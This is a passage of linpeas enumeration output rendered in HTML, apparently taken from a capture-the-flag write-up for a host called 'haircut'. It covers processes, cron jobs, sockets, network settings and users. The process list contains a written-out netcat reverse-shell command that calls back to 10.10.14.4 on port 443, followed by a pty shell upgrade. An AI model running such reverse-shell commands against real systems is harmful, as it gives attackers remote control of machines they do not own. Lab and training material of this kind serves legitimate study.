  </span><br><span class="hljs-string">                                   ╚═══════════╝                                         </span><br><span class="hljs-string">╔══════════╣ Container related tools present (if any):</span><br><span class="hljs-string">/usr/bin/lxc                                                                             </span><br><span class="hljs-string">╔══════════╣ Am I Containered?</span><br><span class="hljs-string">╔══════════╣ Container details                                                           </span><br><span class="hljs-string">═╣ Is this a container? ........... No                                                   </span><br><span class="hljs-string">═╣ Any running containers? ........ No                                                   </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string"></span><br><span class="hljs-string">                                     ╔═══════╗</span><br><span class="hljs-string">═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════      </span><br><span class="hljs-string">                                     ╚═══════╝                                           </span><br><span class="hljs-string">═╣ Google Cloud Platform? ............... No</span><br><span class="hljs-string">═╣ AWS ECS? ............................. No</span><br><span class="hljs-string">═╣ AWS EC2? ............................. No</span><br><span class="hljs-string">═╣ AWS EC2 Beanstalk? ................... No</span><br><span class="hljs-string">═╣ AWS Lambda? .......................... No</span><br><span class="hljs-string">═╣ AWS Codebuild? ....................... No</span><br><span class="hljs-string">═╣ DO Droplet? .......................... No</span><br><span class="hljs-string">═╣ IBM Cloud VM? ........................ No</span><br><span class="hljs-string">═╣ Azure VM? ............................ No</span><br><span class="hljs-string">═╣ Azure APP? ........................... No</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">                ╔════════════════════════════════════════════════╗</span><br><span class="hljs-string">════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════       </span><br><span class="hljs-string">                ╚════════════════════════════════════════════════╝                       </span><br><span class="hljs-string">╔══════════╣ Cleaned processes</span><br><span class="hljs-string">╚ Check weird &amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                       </span><br><span class="hljs-string">root         1  0.0  0.2  37744  5792 ?        Ss   09:16   0:02 /sbin/init              </span><br><span class="hljs-string">root       449  0.0  0.1  29648  2692 ?        Ss   09:17   0:00 /lib/systemd/systemd-journald</span><br><span class="hljs-string">root       484  0.0  0.0  94772  1516 ?        Ss   09:17   0:00 /sbin/lvmetad -f</span><br><span class="hljs-string">root       511  0.0  0.2  44700  4188 ?        Ss   09:17   0:00 /lib/systemd/systemd-udevd                                                                                       </span><br><span class="hljs-string">systemd+   570  0.0  0.1 100324  2568 ?        Ssl  09:17   0:00 /lib/systemd/systemd-timesyncd</span><br><span class="hljs-string">  └─(Caps) 0x0000000002000000=cap_sys_time</span><br><span class="hljs-string">root       987  0.0  0.0   5224   156 ?        Ss   09:17   0:00 /sbin/iscsid</span><br><span class="hljs-string">root       988  0.0  0.1   5724  3512 ?        S&lt;Ls 09:17   0:00 /sbin/iscsid</span><br><span class="hljs-string">root      1006  0.0  0.3 275868  6232 ?        Ssl  09:17   0:00 /usr/lib/accountsservice/accounts-daemon[0m</span><br><span class="hljs-string">root      1025  0.1  0.4 192108 10228 ?        Ssl  09:17   0:04 /usr/bin/vmtoolsd</span><br><span class="hljs-string">root      1030  0.0  0.2  65520  6132 ?        Ss   09:17   0:00 /usr/sbin/sshd -D</span><br><span class="hljs-string">root      1033  0.0  0.0  20100  1280 ?        Ss   09:17   0:00 /lib/systemd/systemd-logind</span><br><span class="hljs-string">message+  1038  0.0  0.1  42900  3864 ?        Ss   09:17   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation</span><br><span class="hljs-string">  └─(Caps) 0x0000000020000000=cap_audit_write</span><br><span class="hljs-string">daemon[0m    1076  0.0  0.1  26044  2120 ?        Ss   09:17   0:00 /usr/sbin/atd -f</span><br><span class="hljs-string">root      1080  0.0  0.3 629388  6228 ?        Ssl  09:17   0:00 /usr/bin/lxcfs /var/lib/lxcfs/</span><br><span class="hljs-string">root      1084  0.0  0.1  29008  3008 ?        Ss   09:17   0:00 /usr/sbin/cron -f</span><br><span class="hljs-string">root      1091  0.0  0.0   4400  1276 ?        Ss   09:17   0:00 /usr/sbin/acpid</span><br><span class="hljs-string">syslog    1092  0.0  0.1 256396  3472 ?        Ssl  09:17   0:00 /usr/sbin/rsyslogd -n</span><br><span class="hljs-string">root      1101  0.0  1.1 340880 23780 ?        Ssl  09:17   0:00 /usr/lib/snapd/snapd</span><br><span class="hljs-string">mysql     1116  0.0  7.7 1115840 158912 ?      Ssl  09:17   0:02 /usr/sbin/mysqld</span><br><span class="hljs-string">root      1168  0.0  0.2 277180  6100 ?        Ssl  09:17   0:00 /usr/lib/policykit-1/polkitd --no-debug</span><br><span class="hljs-string">root      1184  0.0  0.0  15940  1716 tty1     Ss+  09:17   0:00 /sbin/agetty --noclear tty1 linux</span><br><span class="hljs-string">root      1197  0.0  0.0  13376   168 ?        Ss   09:17   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog</span><br><span class="hljs-string">root      1210  0.0  0.0 125112  1464 ?        Ss   09:17   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;</span><br><span class="hljs-string">www-data  1214  0.2  0.2 125712  5104 ?        S    09:17   0:13  _ nginx: worker process</span><br><span class="hljs-string">root      1220  0.0  1.2 221516 25084 ?        Ss   09:17   0:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)</span><br><span class="hljs-string">www-data  1223  0.0  0.5 221736 10784 ?        S    09:17   0:00  _ php-fpm: pool www</span><br><span class="hljs-string">www-data  1224  0.0  0.5 221736 10452 ?        S    09:17   0:00  _ php-fpm: pool www</span><br><span class="hljs-string">www-data  4096  0.0  0.0   4508   744 ?        S    10:18   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.4 443 &gt;/tmp/f</span><br><span class="hljs-string">www-data  4099  0.0  0.0   4536   668 ?        S    10:18   0:00  |       _ cat /tmp/f</span><br><span class="hljs-string">www-data  4100  0.0  0.0   4508   844 ?        S    10:18   0:00  |       _ sh -i</span><br><span class="hljs-string">www-data  4103  0.0  0.4  35836  8392 ?        S    10:18   0:00  |       |   _ python3 -c import pty;pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="hljs-string">www-data  4104  0.0  0.1  18220  3272 pts/0    Ss   10:18   0:00  |       |       _ /bin/bash</span><br><span class="hljs-string">www-data  4136  0.2  0.1   5452  2592 pts/0    S+   10:34   0:00  |       |           _ /bin/sh ./linpeas.sh</span><br><span class="hljs-string">www-data  8793  0.0  0.0   5452  1048 pts/0    S+   10:34   0:00  |       |               _ /bin/sh ./linpeas.sh</span><br><span class="hljs-string">www-data  8797  0.0  0.1  34556  3052 pts/0    R+   10:34   0:00  |       |               |   _ ps fauxwww</span><br><span class="hljs-string">www-data  8796  0.0  0.0   5452  1048 pts/0    S+   10:34   0:00  |       |               _ /bin/sh ./linpeas.sh</span><br><span class="hljs-string">www-data  4101  0.0  0.0   6496  1812 ?        S    10:18   0:00  |       _ nc 10.10.14.4 443</span><br><span class="hljs-string">www-data  4024  0.0  0.4 221736  9864 ?        S    09:57   0:00  _ php-fpm: pool www</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Binary processes permissions (non &#x27;</span>root root<span class="hljs-string">&#x27; and not belonging to current user)                                                                                     </span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes             </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">╔══════════╣ Processes whose PPID belongs to a different user (not root)</span><br><span class="hljs-string">╚ You will know if a user can somehow spawn processes as a different user                </span><br><span class="hljs-string">Proc 570 with ppid 1 is run by user systemd-timesync but the ppid user is root           </span><br><span class="hljs-string">Proc 1038 with ppid 1 is run by user messagebus but the ppid user is root</span><br><span class="hljs-string">Proc 1076 with ppid 1 is run by user daemon but the ppid user is root</span><br><span class="hljs-string">Proc 1092 with ppid 1 is run by user syslog but the ppid user is root</span><br><span class="hljs-string">Proc 1116 with ppid 1 is run by user mysql but the ppid user is root</span><br><span class="hljs-string">Proc 1214 with ppid 1210 is run by user www-data but the ppid user is root</span><br><span class="hljs-string">Proc 1223 with ppid 1220 is run by user www-data but the ppid user is root</span><br><span class="hljs-string">Proc 1224 with ppid 1220 is run by user www-data but the ppid user is root</span><br><span class="hljs-string">Proc 4024 with ppid 1220 is run by user www-data but the ppid user is root</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Files opened by processes belonging to other users</span><br><span class="hljs-string">╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                </span><br><span class="hljs-string">COMMAND     PID  TID             USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Processes with credentials in memory (root req)</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                </span><br><span class="hljs-string">gdm-password Not Found                                                                   </span><br><span class="hljs-string">gnome-keyring-daemon Not Found                                                           </span><br><span class="hljs-string">lightdm Not Found                                                                        </span><br><span class="hljs-string">vsftpd Not Found                                                                         </span><br><span class="hljs-string">apache2 Not Found                                                                        </span><br><span class="hljs-string">sshd Not Found                                                                           </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">╔══════════╣ Cron jobs</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs   </span><br><span class="hljs-string">/usr/bin/crontab                                                                         </span><br><span class="hljs-string">incrontab Not Found</span><br><span class="hljs-string">-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab                                 </span><br><span class="hljs-string"></span><br><span class="hljs-string">/etc/cron.d:</span><br><span class="hljs-string">total 28</span><br><span class="hljs-string">drwxr-xr-x   2 root root 4096 May 16  2017 .</span><br><span class="hljs-string">drwxr-xr-x 109 root root 4096 Jul 13  2021 ..</span><br><span class="hljs-string">-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder</span><br><span class="hljs-string">-rw-r--r--   1 root root  244 Dec 29  2014 anacron</span><br><span class="hljs-string">-rw-r--r--   1 root root  589 Jul 16  2014 mdadm</span><br><span class="hljs-string">-rw-r--r--   1 root root  670 Mar  1  2016 php</span><br><span class="hljs-string">-rw-r--r--   1 root root  190 May 15  2017 popularity-contest</span><br><span class="hljs-string"></span><br><span class="hljs-string">/etc/cron.daily:</span><br><span class="hljs-string">total 64</span><br><span class="hljs-string">drwxr-xr-x   2 root root 4096 May 16  2017 .</span><br><span class="hljs-string">drwxr-xr-x 109 root root 4096 Jul 13  2021 ..</span><br><span class="hljs-string">-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  311 Dec 29  2014 0anacron</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  376 Mar 31  2016 apport</span><br><span class="hljs-string">-rwxr-xr-x   1 root root 1474 Jan 17  2017 apt-compat</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  355 May 22  2012 bsdmainutils</span><br><span class="hljs-string">-rwxr-xr-x   1 root root 1597 Nov 27  2015 dpkg</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  372 May  6  2015 logrotate</span><br><span class="hljs-string">-rwxr-xr-x   1 root root 1293 Nov  6  2015 man-db</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  539 Jul 16  2014 mdadm</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  435 Nov 18  2014 mlocate</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  249 Nov 12  2015 passwd</span><br><span class="hljs-string">-rwxr-xr-x   1 root root 3449 Feb 26  2016 popularity-contest</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  214 May 24  2016 update-notifier-common</span><br><span class="hljs-string">-rwxr-xr-x   1 root root 1046 May 19  2016 upstart</span><br><span class="hljs-string"></span><br><span class="hljs-string">/etc/cron.hourly:</span><br><span class="hljs-string">total 12</span><br><span class="hljs-string">drwxr-xr-x   2 root root 4096 May 15  2017 .</span><br><span class="hljs-string">drwxr-xr-x 109 root root 4096 Jul 13  2021 ..</span><br><span class="hljs-string">-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder</span><br><span class="hljs-string"></span><br><span class="hljs-string">/etc/cron.monthly:</span><br><span class="hljs-string">total 16</span><br><span class="hljs-string">drwxr-xr-x   2 root root 4096 May 16  2017 .</span><br><span class="hljs-string">drwxr-xr-x 109 root root 4096 Jul 13  2021 ..</span><br><span class="hljs-string">-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  313 Dec 29  2014 0anacron</span><br><span class="hljs-string"></span><br><span class="hljs-string">/etc/cron.weekly:</span><br><span class="hljs-string">total 28</span><br><span class="hljs-string">drwxr-xr-x   2 root root 4096 May 16  2017 .</span><br><span class="hljs-string">drwxr-xr-x 109 root root 4096 Jul 13  2021 ..</span><br><span class="hljs-string">-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  312 Dec 29  2014 0anacron</span><br><span class="hljs-string">-rwxr-xr-x   1 root root   86 Apr 13  2016 fstrim</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  771 Nov  6  2015 man-db</span><br><span class="hljs-string">-rwxr-xr-x   1 root root  211 May 24  2016 update-notifier-common</span><br><span class="hljs-string"></span><br><span class="hljs-string">/var/spool/anacron:</span><br><span class="hljs-string">total 20</span><br><span class="hljs-string">drwxr-xr-x 2 root root 4096 May 16  2017 .</span><br><span class="hljs-string">drwxr-xr-x 5 root root 4096 May 16  2017 ..</span><br><span class="hljs-string">-rw------- 1 root root    9 Jan  3 09:22 cron.daily</span><br><span class="hljs-string">-rw------- 1 root root    9 Jan  3 09:32 cron.monthly</span><br><span class="hljs-string">-rw------- 1 root root    9 Jan  3 09:27 cron.weekly</span><br><span class="hljs-string"></span><br><span class="hljs-string">SHELL=/bin/sh</span><br><span class="hljs-string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="hljs-string"></span><br><span class="hljs-string">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="hljs-string">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="hljs-string">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="hljs-string">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">SHELL=/bin/sh</span><br><span class="hljs-string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="hljs-string">HOME=/root</span><br><span class="hljs-string">LOGNAME=root</span><br><span class="hljs-string"></span><br><span class="hljs-string">1       5       cron.daily      run-parts --report /etc/cron.daily</span><br><span class="hljs-string">7       10      cron.weekly     run-parts --report /etc/cron.weekly</span><br><span class="hljs-string">@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Systemd PATH</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                    </span><br><span class="hljs-string">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                        </span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Analyzing .service files</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services              </span><br><span class="hljs-string">/etc/systemd/system/final.target.wants/snapd.system-shutdown.service could be executing some relative path</span><br><span class="hljs-string">/etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path</span><br><span class="hljs-string">/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path</span><br><span class="hljs-string">/etc/systemd/system/sysinit.target.wants/friendly-recovery.service could be executing some relative path</span><br><span class="hljs-string">You can&#x27;</span>t write on systemd PATH<br><br>╔══════════╣ System timers<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#timers                </span><br>NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES<br>Thu 2024-01-04 02:26:25 CET  15h left    Wed 2024-01-03 09:17:07 CET  1h 17min ago apt-daily.timer              apt-daily.service                                                 <br>Thu 2024-01-04 09:31:55 CET  22h left    Wed 2024-01-03 09:31:55 CET  1h 2min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service                                    <br>Mon 2024-01-08 03:48:58 CET  4 days left Wed 2024-01-03 10:05:28 CET  29min ago    snapd.refresh.timer          snapd.refresh.service                                             <br>n/a                          n/a         n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service                                           <br><br>╔══════════╣ Analyzing .timer files<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#timers                </span><br>                                                                                         <br>╔══════════╣ Analyzing .socket files<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#sockets               </span><br>/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                                       <br>/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                <br>/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                           <br>/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                          <br>/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                   <br>/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                   <br>/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog                                                                                  <br>/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                  <br>/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                               <br>/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                        <br>/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                        <br>/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request<br><br>╔══════════╣ Unix Sockets Listening<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#sockets               </span><br>/run/acpid.socket                                                                        <br>  └─(Read Write)<br>/run/dbus/system_bus_socket<br>  └─(Read Write)<br>/run/lvm/lvmetad.socket<br>/run/lvm/lvmpolld.socket<br>/run/mysqld/mysqld.sock<br>  └─(Read Write)<br>/run/php/php7.0-fpm.sock<br>  └─(Read Write)<br>/run/snapd-snap.socket<br>  └─(Read Write)<br>/run/snapd.socket<br>  └─(Read Write)<br>/run/systemd/fsck.progress<br>/run/systemd/journal/dev-log<br>  └─(Read Write)<br>/run/systemd/journal/socket<br>  └─(Read Write)<br>/run/systemd/journal/stdout<br>  └─(Read Write)<br>/run/systemd/journal/syslog<br>  └─(Read Write)<br>/run/systemd/notify<br>  └─(Read Write)<br>/run/systemd/private<br>  └─(Read Write)<br>/run/udev/control<br>/run/uuidd/request<br>  └─(Read Write)<br>/var/lib/lxd/unix.socket<br>/var/run/dbus/system_bus_socket<br>  └─(Read Write)<br>/var/run/mysqld/mysqld.sock<br>  └─(Read Write)<br><br>╔══════════╣ D-Bus config files<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#d-bus                 </span><br>Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  &lt;policy group=<span class="hljs-string">&quot;bluetooth&quot;</span>&gt;<br>  &lt;policy group=<span class="hljs-string">&quot;lp&quot;</span>&gt;)<br>Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        &lt;policy user=<span class="hljs-string">&quot;dnsmasq&quot;</span>&gt;)<br>Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.NetworkManager.conf (        &lt;policy user=<span class="hljs-string">&quot;whoopsie&quot;</span>&gt;)<br>Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        &lt;policy user=<span class="hljs-string">&quot;systemd-network&quot;</span>&gt;)<br>Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        &lt;policy user=<span class="hljs-string">&quot;systemd-resolve&quot;</span>&gt;)<br>Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  &lt;policy user=<span class="hljs-string">&quot;pulse&quot;</span>&gt;)<br>Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        &lt;policy group=<span class="hljs-string">&quot;netdev&quot;</span>&gt;)<br><br>╔══════════╣ D-Bus Service Objects list<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#d-bus                 </span><br>NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        <br>:1.0                                   1 systemd         root             :1.0          init.scope                -          -                  <br>:1.1                                1033 systemd-logind  root             :1.1          systemd-logind.service    -          -                  <br>:1.10                              12140 busctl          www-data         :1.10         php7.0-fpm.service        -          -                  <br>:1.2                                1006 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  <br>:1.3                                1168 polkitd         root             :1.3          polkitd.service           -          -                  <br>com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         <br>com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         <br>org.freedesktop.Accounts            1006 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  <br>org.freedesktop.DBus                1038 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -                                          <br>org.freedesktop.PolicyKit1          1168 polkitd         root             :1.3          polkitd.service           -          -                  <br>org.freedesktop.hostname1              - -               -                (activatable) -                         -         <br>org.freedesktop.locale1                - -               -                (activatable) -                         -         <br>org.freedesktop.login1              1033 systemd-logind  root             :1.1          systemd-logind.service    -          -                  <br>org.freedesktop.network1               - -               -                (activatable) -                         -         <br>org.freedesktop.resolve1               - -               -                (activatable) -                         -         <br>org.freedesktop.systemd1               1 systemd         root             :1.0          init.scope                -          -                  <br>org.freedesktop.timedate1              - -               -                (activatable) -                         -         <br><br><br>                              ╔═════════════════════╗<br>══════════════════════════════╣ Network Information ╠══════════════════════════════      <br>                              ╚═════════════════════╝                                    <br>╔══════════╣ Hostname, hosts and DNS<br>haircut                                                                                  <br>127.0.0.1       localhost<br>10.10.20.20     haircut<br><br>::1     localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br>nameserver 8.8.8.8<br><br>╔══════════╣ Interfaces<br>default         0.0.0.0                                                                  <br>loopback        127.0.0.0<br>link-local      169.254.0.0<br>localnet        10.10.20.0<br>ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:bf:f5  <br>          inet addr:10.10.10.24  Bcast:10.10.10.255  Mask:255.255.255.0<br>          inet6 addr: dead:beef::250:56ff:feb9:bff5/64 Scope:Global<br>          inet6 addr: fe80::250:56ff:feb9:bff5/64 Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br>          RX packets:885638 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:193175 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:1000 <br>          RX bytes:76313349 (76.3 MB)  TX bytes:37981057 (37.9 MB)<br><br>lo        Link encap:Local Loopback  <br>          inet addr:127.0.0.1  Mask:255.0.0.0<br>          inet6 addr: ::1/128 Scope:Host<br>          UP LOOPBACK RUNNING  MTU:65536  Metric:1<br>          RX packets:230 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:230 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:1 <br>          RX bytes:20893 (20.8 KB)  TX bytes:20893 (20.8 KB)<br><br><br>╔══════════╣ Active Ports<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#open-ports            </span><br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               <br>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1214/nginx: worker <br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               <br>tcp6       0      0 :::80                   :::*                    LISTEN      1214/nginx: worker <br>tcp6       0      0 :::22                   :::*                    LISTEN      -               <br><br>╔══════════╣ Can I sniff with tcpdump?<br>No                                                                                       <br>                                                                                         <br><br><br>                               ╔═══════════════════╗<br>═══════════════════════════════╣ Users Information ╠═══════════════════════════════      <br>                               ╚═══════════════════╝                                     <br>╔══════════╣ My user<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#users                 </span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)                                    <br><br>╔══════════╣ Do I have PGP keys?<br>/usr/bin/gpg                                                                             <br>netpgpkeys Not Found<br>netpgp Not Found                                                                         <br>                                                                                         <br>╔══════════╣ Checking <span class="hljs-string">&#x27;sudo -l&#x27;</span>, /etc/sudoers, and /etc/sudoers.d<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#sudo-and-suid         </span><br>                                                                                         <br>╔══════════╣ Checking sudo tokens<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#reusing-sudo-tokens   </span><br>ptrace protection is enabled (1)                                                         <br><br>╔══════════╣ Checking Pkexec policy<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe<span class="hljs-comment">#pe-method-2                                                                        </span><br>                                                                                         <br>[Configuration]<br>AdminIdentities=unix-user:0<br>[Configuration]<br>AdminIdentities=unix-group:sudo;unix-group:admin<br><br>╔══════════╣ Superusers<br>root:x:0:0:root:/root:/bin/bash                                                          <br><br>╔══════════╣ Users with console<br>maria:x:1000:1000:maria,,,:/home/maria:/bin/bash                                         <br>root:x:0:0:root:/root:/bin/bash<br><br>╔══════════╣ All <span class="hljs-built_in">users</span> &amp; <span class="hljs-built_in">groups</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)                                                   <br>uid=1(daemon[0m) gid=1(daemon[0m) <span class="hljs-built_in">groups</span>=1(daemon[0m)<br>uid=10(uucp) gid=10(uucp) <span class="hljs-built_in">groups</span>=10(uucp)<br>uid=100(systemd-timesync) gid=102(systemd-timesync) <span class="hljs-built_in">groups</span>=102(systemd-timesync)<br>uid=1000(maria) gid=1000(maria) <span class="hljs-built_in">groups</span>=1000(maria),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)                                            <br>uid=101(systemd-network) gid=103(systemd-network) <span class="hljs-built_in">groups</span>=103(systemd-network)<br>uid=102(systemd-resolve) gid=104(systemd-resolve) <span class="hljs-built_in">groups</span>=104(systemd-resolve)<br>uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) <span class="hljs-built_in">groups</span>=105(systemd-bus-proxy)<br>uid=104(syslog) gid=108(syslog) <span class="hljs-built_in">groups</span>=108(syslog),4(adm)<br>uid=105(_apt) gid=65534(nogroup) <span class="hljs-built_in">groups</span>=65534(nogroup)<br>uid=106(lxd) gid=65534(nogroup) <span class="hljs-built_in">groups</span>=65534(nogroup)<br>uid=107(messagebus) gid=111(messagebus) <span class="hljs-built_in">groups</span>=111(messagebus)<br>uid=108(uuidd) gid=112(uuidd) <span class="hljs-built_in">groups</span>=112(uuidd)<br>uid=109(dnsmasq) gid=65534(nogroup) <span class="hljs-built_in">groups</span>=65534(nogroup)<br>uid=110(mysql) gid=117(mysql) <span class="hljs-built_in">groups</span>=117(mysql)<br>uid=111(lightdm) gid=118(lightdm) <span class="hljs-built_in">groups</span>=118(lightdm)<br>uid=112(pulse) gid=121(pulse) <span class="hljs-built_in">groups</span>=121(pulse),29(audio)<br>uid=113(sshd) gid=65534(nogroup) <span class="hljs-built_in">groups</span>=65534(nogroup)<br>uid=13(proxy) gid=13(proxy) <span class="hljs-built_in">groups</span>=13(proxy)<br>uid=2(bin) gid=2(bin) <span class="hljs-built_in">groups</span>=2(bin)<br>uid=3(sys) gid=3(sys) <span class="hljs-built_in">groups</span>=3(sys)<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>uid=34(backup) gid=34(backup) <span class="hljs-built_in">groups</span>=34(backup)<br>uid=38(list) gid=38(list) <span class="hljs-built_in">groups</span>=38(list)<br>uid=39(irc) gid=39(irc) <span class="hljs-built_in">groups</span>=39(irc)<br>uid=4(<span class="hljs-built_in">sync</span>) gid=65534(nogroup) <span class="hljs-built_in">groups</span>=65534(nogroup)<br>uid=41(gnats) gid=41(gnats) <span class="hljs-built_in">groups</span>=41(gnats)<br>uid=5(games) gid=60(games) <span class="hljs-built_in">groups</span>=60(games)<br>uid=6(man) gid=12(man) <span class="hljs-built_in">groups</span>=12(man)<br>uid=65534(nobody) gid=65534(nogroup) <span class="hljs-built_in">groups</span>=65534(nogroup)<br>uid=7(lp) gid=7(lp) <span class="hljs-built_in">groups</span>=7(lp)<br>uid=8(mail) gid=8(mail) <span class="hljs-built_in">groups</span>=8(mail)<br>uid=9(news) gid=9(news) <span class="hljs-built_in">groups</span>=9(news)<br><br>╔══════════╣ Login now<br> 10:34:53 up  1:18,  0 <span class="hljs-built_in">users</span>,  load average: 0.21, 0.06, 0.02                            <br>USER     TTY      FROM             